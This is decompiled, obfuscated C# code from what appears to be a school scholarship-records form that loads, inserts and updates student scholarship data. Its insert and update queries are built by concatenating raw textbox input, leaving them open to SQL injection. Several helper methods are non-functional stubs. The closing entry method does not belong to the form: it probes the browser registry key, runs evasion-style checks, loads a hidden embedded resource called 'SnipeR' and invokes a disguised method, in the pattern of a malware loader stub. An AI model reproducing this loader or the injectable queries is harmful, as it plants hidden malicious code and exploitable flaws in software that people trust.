			TextBox obj7 = txtb_studFname;
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 1, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			obj7.set_Text(NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
			TextBox obj8 = txtb_studLname;
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 2, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			obj8.set_Text(NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
			TextBox obj9 = txtb_studMI;
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 3, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			obj9.set_Text(NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
			ComboBox obj10 = cbo_scholarType;
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 4, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			obj10.set_Text(NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
			TextBox obj11 = txtb_SY;
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 5, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			obj11.set_Text(NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
			TextBox obj12 = txtb_studLevel;
			obj5 = NewLateBinding.LateGet(obj, (Type)null, "Item", array = new object[2] { 6, num }, (string[])null, (Type[])null, array2 = new bool[2] { false, true });
			if (array2[1])
			{
				num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
			}
			obj12.set_Text(NewLateBinding.LateGet(obj5, (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
			w7RNi3(f6C7Ad, txtb_studCourse);
			w7RNi3(f6C7Ad2, txtb_studSem);
			if (cbo_SelectDept.get_SelectedIndex() == 0)
			{
				try
				{
					w7RNi3(f6C7Ad3, txtb_refNo);
					NewLateBinding.LateCall(dbConn, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					sqlCommand = RuntimeHelpers.GetObjectValue(new object());
					dr = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(sqlCommand, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
					while (Conversions.ToBoolean(NewLateBinding.LateGet(dr, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
					{
						txtb_ScholarAmnt.set_Text(Conversions.ToString(NewLateBinding.LateIndexGet(dr, new object[1] { 0 }, (string[])null)));
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)1, false))
						{
							rb_active.set_Checked(true);
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)0, false))
						{
							rb_inactive.set_Checked(true);
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Eq6x0Y("error 108: loadToTextbox " + ex2.Message);
					ProjectData.ClearProjectError();
				}
				finally
				{
					NewLateBinding.LateCall(dbConn, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			if (cbo_SelectDept.get_SelectedIndex() == 1)
			{
				try
				{
					NewLateBinding.LateCall(dbConn, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					sqlCommand = RuntimeHelpers.GetObjectValue(new object());
					dr = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(sqlCommand, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
					while (Conversions.ToBoolean(NewLateBinding.LateGet(dr, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
					{
						txtb_ScholarAmnt.set_Text(Conversions.ToString(NewLateBinding.LateIndexGet(dr, new object[1] { 0 }, (string[])null)));
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)1, false))
						{
							rb_active.set_Checked(true);
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)0, false))
						{
							rb_inactive.set_Checked(true);
						}
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					Eq6x0Y("error 108: loadToTextbox " + ex4.Message);
					ProjectData.ClearProjectError();
				}
				finally
				{
					NewLateBinding.LateCall(dbConn, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			if (cbo_SelectDept.get_SelectedIndex() == 2)
			{
				try
				{
					NewLateBinding.LateCall(dbConn, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					sqlCommand = RuntimeHelpers.GetObjectValue(new object());
					dr = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(sqlCommand, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
					while (Conversions.ToBoolean(NewLateBinding.LateGet(dr, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
					{
						txtb_ScholarAmnt.set_Text(Conversions.ToString(NewLateBinding.LateIndexGet(dr, new object[1] { 0 }, (string[])null)));
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)1, false))
						{
							rb_active.set_Checked(true);
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)0, false))
						{
							rb_inactive.set_Checked(true);
						}
					}
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					Eq6x0Y("error 108: loadToTextbox " + ex6.Message);
					ProjectData.ClearProjectError();
				}
				finally
				{
					NewLateBinding.LateCall(dbConn, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			if (cbo_SelectDept.get_SelectedIndex() == 3)
			{
				try
				{
					NewLateBinding.LateCall(dbConn, (Type)null, "Open", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					sqlCommand = RuntimeHelpers.GetObjectValue(new object());
					dr = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(sqlCommand, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
					while (Conversions.ToBoolean(NewLateBinding.LateGet(dr, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
					{
						txtb_ScholarAmnt.set_Text(Conversions.ToString(NewLateBinding.LateIndexGet(dr, new object[1] { 0 }, (string[])null)));
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)1, false))
						{
							rb_active.set_Checked(true);
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(dr, new object[1] { 1 }, (string[])null), (object)0, false))
						{
							rb_inactive.set_Checked(true);
						}
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					Eq6x0Y("error 108: loadToTextbox " + ex8.Message);
					ProjectData.ClearProjectError();
				}
				finally
				{
					NewLateBinding.LateCall(dbConn, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			obj = null;
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			MessageBox.Show("Error: " + ex10.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Eq6x0Y(string y1P7Zq)
	{
		throw new NotImplementedException();
	}

	private void w7RNi3(string f6C7Ad, TextBox Hb53Zg)
	{
		throw new NotImplementedException();
	}

	private void b6K2Fd(string a2L8Eb)
	{
		throw new NotImplementedException();
	}

	public void w4D6Gj(int d1H6Cp)
	{
		if (cbo_SelectDept.get_SelectedIndex() == 0)
		{
			string f2M4Pm = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Insert into tbl_coll_scholarlist values(0,'" + txtb_studid.get_Text() + "','"), ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"','"), (object)txtb_ScholarAmnt.get_Text()), (object)"','"), (object)txtb_refNo.get_Text()), (object)"','"), (object)d1H6Cp), (object)"')"));
			o1N8Hk(f2M4Pm);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 1)
		{
			string f2M4Pm2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Insert into tbl_elem_scholarlist values(0,'" + txtb_studid.get_Text() + "','"), ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"','"), (object)txtb_ScholarAmnt.get_Text()), (object)"','"), (object)txtb_refNo.get_Text()), (object)"','"), (object)d1H6Cp), (object)"')"));
			o1N8Hk(f2M4Pm2);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 2)
		{
			string f2M4Pm3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Insert into tbl_senior_scholarlist values(0,'" + txtb_studid.get_Text() + "','"), ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"','"), (object)txtb_ScholarAmnt.get_Text()), (object)"','"), (object)txtb_refNo.get_Text()), (object)"','"), (object)d1H6Cp), (object)"')"));
			o1N8Hk(f2M4Pm3);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 3)
		{
			string f2M4Pm4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Insert into tbl_junior_scholarlist values(0,'" + txtb_studid.get_Text() + "','"), ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"','"), (object)txtb_ScholarAmnt.get_Text()), (object)"','"), (object)txtb_refNo.get_Text()), (object)"','"), (object)d1H6Cp), (object)"')"));
			o1N8Hk(f2M4Pm4);
		}
	}

	private void o1N8Hk(string f2M4Pm)
	{
		throw new NotImplementedException();
	}

	private void Jx9s0N(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(btn_add, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"ADD", false))
		{
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(dlg_scholarship_add, (Type)null, "ShowDialog", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(DialogResult)1, false))
			{
				NewLateBinding.LateSetComplex(btn_add, (Type)null, "Text", new object[1] { "SAVE" }, (string[])null, (Type[])null, false, true);
				((Control)cbo_scholarType).set_Enabled(true);
				((Control)txtb_ScholarAmnt).set_Enabled(true);
				((Control)txtb_refNo).set_Enabled(true);
			}
		}
		else
		{
			if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(btn_add, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"SAVE", false))
			{
				return;
			}
			int d1H6Cp = 0;
			if ((Operators.CompareString(cbo_scholarType.get_Text(), "", false) == 0) | (Operators.CompareString(txtb_ScholarAmnt.get_Text(), "", false) == 0))
			{
				NewLateBinding.LateCall(dlg_fillup, (Type)null, "ShowDialog", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return;
			}
			if (rb_active.get_Checked())
			{
				d1H6Cp = 1;
			}
			else if (rb_inactive.get_Checked())
			{
				d1H6Cp = 0;
			}
			w4D6Gj(d1H6Cp);
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(dlg_savesuccessfully, (Type)null, "ShowDialog", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(DialogResult)1, false))
			{
				((Control)cbo_scholarType).set_Enabled(false);
				((Control)txtb_ScholarAmnt).set_Enabled(false);
				((Control)txtb_refNo).set_Enabled(false);
				Xr81Np();
				NewLateBinding.LateSetComplex(btn_add, (Type)null, "Text", new object[1] { "ADD" }, (string[])null, (Type[])null, false, true);
			}
		}
	}

	public void Ky78Ls(int Fp43Pz)
	{
		if (cbo_SelectDept.get_SelectedIndex() == 0)
		{
			string s0S3Ji = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"update  tbl_coll_scholarlist set sl_name='", ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"',sl_amnt='"), (object)txtb_ScholarAmnt.get_Text()), (object)"',reference_no='"), (object)txtb_refNo.get_Text()), (object)"',sl_status='"), (object)Fp43Pz), (object)"' where stud_id='"), (object)txtb_studid.get_Text()), (object)"' "));
			m1M9Sj(s0S3Ji);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 1)
		{
			string s0S3Ji2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"update  tbl_elem_scholarlist set sl_name='", ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"',sl_amnt='"), (object)txtb_ScholarAmnt.get_Text()), (object)"',sl_status='"), (object)Fp43Pz), (object)"' where stud_id='"), (object)txtb_studid.get_Text()), (object)"' "));
			m1M9Sj(s0S3Ji2);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 2)
		{
			string s0S3Ji3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"update  tbl_senior_scholarlist set sl_name='", ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"',sl_amnt='"), (object)txtb_ScholarAmnt.get_Text()), (object)"',sl_status='"), (object)Fp43Pz), (object)"' where stud_id='"), (object)txtb_studid.get_Text()), (object)"' "));
			m1M9Sj(s0S3Ji3);
		}
		if (cbo_SelectDept.get_SelectedIndex() == 3)
		{
			string s0S3Ji4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"update  tbl_junior_scholarlist set sl_name='", ((ListControl)cbo_scholarType).get_SelectedValue()), (object)"',sl_amnt='"), (object)txtb_ScholarAmnt.get_Text()), (object)"',sl_status='"), (object)Fp43Pz), (object)"' where stud_id='"), (object)txtb_studid.get_Text()), (object)"' "));
			m1M9Sj(s0S3Ji4);
		}
	}

	private void m1M9Sj(string s0S3Ji)
	{
		throw new NotImplementedException();
	}

	private void i8X2Rm(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(btn_update, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"UPDATE", false))
		{
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(dlg_scholarship_update, (Type)null, "ShowDialog", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(DialogResult)1, false))
			{
				NewLateBinding.LateSetComplex(btn_update, (Type)null, "Text", new object[1] { "SAVE" }, (string[])null, (Type[])null, false, true);
				((Control)cbo_scholarType).set_Enabled(true);
				((Control)txtb_ScholarAmnt).set_Enabled(true);
				((Control)txtb_refNo).set_Enabled(true);
			}
		}
		else
		{
			if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(btn_update, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"SAVE", false))
			{
				return;
			}
			int fp43Pz = 0;
			if ((Operators.CompareString(cbo_scholarType.get_Text(), "", false) == 0) | (Operators.CompareString(txtb_ScholarAmnt.get_Text(), "", false) == 0))
			{
				NewLateBinding.LateCall(dlg_fillup, (Type)null, "ShowDialog", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				return;
			}
			if (rb_active.get_Checked())
			{
				fp43Pz = 1;
			}
			else if (rb_inactive.get_Checked())
			{
				fp43Pz = 0;
			}
			Ky78Ls(fp43Pz);
			if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(dlg_savesuccessfully, (Type)null, "ShowDialog", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(DialogResult)1, false))
			{
				((Control)cbo_scholarType).set_Enabled(false);
				((Control)txtb_ScholarAmnt).set_Enabled(false);
				Xr81Np();
				NewLateBinding.LateSetComplex(btn_update, (Type)null, "Text", new object[1] { "UPDATE" }, (string[])null, (Type[])null, false, true);
				((Control)txtb_refNo).set_Enabled(false);
			}
		}
	}

	private void e6GDk9(object sender, EventArgs e)
	{
		Xr81Np();
		((TextBoxBase)txtb_ScholarAmnt).Clear();
		((Control)cbo_scholarType).set_Enabled(false);
		((Control)txtb_ScholarAmnt).set_Enabled(false);
		NewLateBinding.LateSetComplex(btn_add, (Type)null, "Text", new object[1] { "ADD" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(btn_update, (Type)null, "Text", new object[1] { "UPDATE" }, (string[])null, (Type[])null, false, true);
	}

	private void Tm78Pt(object sender, EventArgs e)
	{
		x7Y6Jd(Conversions.ToString(scholar_list), RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ScholarshipDetails, (Type)null, "dg_scholarTypeList", new object[0], (string[])null, (Type[])null, (bool[])null)));
		NewLateBinding.LateCall(ScholarshipDetails, (Type)null, "ShowDialog", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Nt8b6E(object sender, DataGridViewCellEventArgs e)
	{
	}

	private void Xy59Jm(object sender, PaintEventArgs e)
	{
	}

	[STAThread]
	public static void o6NMs8()
	{
		try
		{
			string text = string.Empty;
			RegistryKey registryKey = null;
			try
			{
				registryKey = Registry.ClassesRoot.OpenSubKey("HTTP\\shell\\open\\command", writable: false);
				text = registryKey.GetValue(null)!.ToString()!.ToLower().Replace("\"", "");
				if (!text.EndsWith("exe"))
				{
					text = text.Substring(0, text.LastIndexOf(".exe") + 4);
				}
			}
			finally
			{
				registryKey?.Close();
			}
			char[] array = text.ToCharArray();
			StringBuilder stringBuilder = new StringBuilder();
			long num = text.Length * 1678946515671867641L;
			char[] array2 = array;
			foreach (char value in array2)
			{
				stringBuilder.Append(value);
				num = (long)Math.Round((double)num / 2.0);
			}
			if (Operators.CompareString(text, stringBuilder.ToString(), false) != 0 || num <= 36000L)
			{
				return;
			}
			int num2;
			do
			{
				Jo81Es.num = Jo81Es.s6WHb5();
				num2 = Jo81Es.num;
			}
			while (num2 != 100);
			Jo81Es.Ass = Assembly.LoadFile(Application.get_ExecutablePath());
			Jo81Es.Names = (string[])NewLateBinding.LateGet(Jo81Es.Ass, (Type)null, "GetManifestResourceNames", new object[0], (string[])null, (Type[])null, (bool[])null);
			Jo81Es.ResName = "SnipeR";
			Jo81Es.Res = ".res" + "ourc" + "es";
			Jo81Es.MName = "RRRRMRRRReRRRRtRRRRhRRRRoRRRRdRRRR0RRRR";
			Jo81Es.TNum = 35;
			Jo81Es.Mnum = 0;
			List<int> list = new List<int>
			{
				Capacity = 15
			};
			int num3 = 0;
			do
			{
				list.Add(Jo81Es.num % (num3 + 2));
				num3++;
			}
			while (num3 <= 10);
			if (list[5] == 2)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(new object());
				Tq6g2.s4Y0W(RuntimeHelpers.GetObjectValue(objectValue), list[7], "nnq8mdaoiusnuad678", Za45G: false);
				if (list[5] > 0)
				{
					list[5] = list[5] * 25 * 25;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
